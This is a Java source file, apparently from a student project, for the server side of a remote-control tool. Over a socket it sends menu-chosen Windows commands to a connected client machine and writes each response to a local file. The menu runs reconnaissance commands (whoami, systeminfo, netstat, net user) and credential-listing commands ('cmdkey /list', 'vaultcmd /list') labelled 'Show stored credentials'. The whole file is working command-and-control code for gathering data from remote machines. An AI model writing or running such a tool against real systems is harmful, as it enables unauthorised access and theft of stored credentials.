/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package edu.eci.haet.server;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import static java.lang.System.in;
import static java.lang.System.out;
import java.net.Socket;
import java.net.SocketException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author estudiante
 */
// ClientHandler class 
class ClientHandler extends Thread {

    DateFormat fordate = new SimpleDateFormat("yyyy/MM/dd");
    DateFormat fortime = new SimpleDateFormat("hh:mm:ss");
    final DataInputStream in;
    final DataOutputStream out;
    DataInputStream input;
    String response;
    boolean connect;
    boolean finish;
    final Socket s;
    final int client;
    String ipClient;

    // Constructor 
    public ClientHandler(Socket s, DataInputStream in, DataOutputStream out, int client) {
        this.s = s;
        this.in = in;
        this.out = out;
        this.connect = false;
        this.finish = false;
        this.client = client;
    }

    @Override
    public void run() {
        input = new DataInputStream(System.in);//comandos del teermnal
        //Boolean actual = Server.getHiloActual();
        //while (!actual) {

        while (true && !finish) {
            try {
                // creating Date object
                if (!connect) {

                    //out.writeUTF("SERVIDOR CONECTADO");
                    System.out.println("---------------------------------");
                    Date date = new Date();
                    System.out.println("Dia: " + fordate.format(date) + " Hora: " + fortime.format(date));
                    out.writeUTF("hostname -I");
                    ipClient = in.readUTF();
                    System.out.println(">> Cliente#: " + client + " - IP: " + ipClient);
                    System.out.println("---------------------------------");

                    connect = true;
                }

                try {
                    String command = showMenu();
                    try {
                        Integer option = Integer.parseInt(command);
                        switch (option) {
                            case 0:
                                execCommand("whoami");
                                break;
                            case 1:
                                execCommand("systeminfo");
                                break;
                            case 2:
                                execCommand("driverquery");
                                break;
                            case 3:
                                execCommand("ipconfig");
                                break;
                            case 4:
                                execCommand("cmdkey /list");
                                break;
                            case 5:
                                execCommand("qprocess");
                                break;
                            case 6:
                                execCommand("quser");
                                break;
                            case 7:
                                execCommand("vaultcmd /list");
                                break;
                            case 8:
                                execCommand("net start");
                                break;
                            case 9:
                                execCommand("netstat");
                                break;
                            case 10:
                                execCommand("net user");
                                break;
                            case 11:
                                execCommand("exit");
                                System.out.println(">> Connection closed");
                                finish = true;
                                System.out.println(">> Waiting for a client ...");
                                break;
                            default:
                                System.out.println("Invalid option");
                                break;
                        }
                    } catch (NumberFormatException ex) {
                        System.out.println("Invalid option");
                    }

                } catch (SocketException i) {
                    System.out.println(i);
                }
            } catch (IOException e) {
                try {
                    System.out.println(">> Client " + this.client + " with IP: " + ipClient + "does not respond.");
                    this.s.close();
                    System.out.println(">> Connection closed.");
                    finish = true;
                    System.out.println(">> Waiting for a client ...");
                    break;
                    //e.printStackTrace();
                } catch (IOException ex) {
                    Logger.getLogger(ClientHandler.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        }

    }

    public void execCommand(String command) throws IOException {
        
        out.writeUTF(command);

        String clientResponse = in.readUTF();

        if (command.equals("exit")) {
            System.out.println(">> Disconnecting the client " + this.client + " with IP: " + ipClient);
        } else {
            try (PrintWriter writer = new PrintWriter("C"+ipClient+command + ".txt", "UTF-8")) {
                writer.println(clientResponse);
            }
        }

    }

    public String showMenu() throws IOException {
        System.out.println(" #Options#");

        System.out.println(">> 0. whoami");
        System.out.println(">> 1. Obtain system information");
        System.out.println(">> 2. Obtain installed controllers");
        System.out.println(">> 3. Red information");
        System.out.println(">> 4. Show stored accounts");
        System.out.println(">> 5. Show active processes information");
        System.out.println(">> 6. Active users");
        System.out.println(">> 7. Show stored credentials");
        System.out.println(">> 8. Active services");
        System.out.println(">> 9. Active connections");
        System.out.println(">> 10. Show all users");
        System.out.println(">> 11. exit (Finish connection)");

        System.out.println(">> Enter the option");
        
        System.out.print("$~ ");
        String option = input.readLine();

        return option;
    }
}
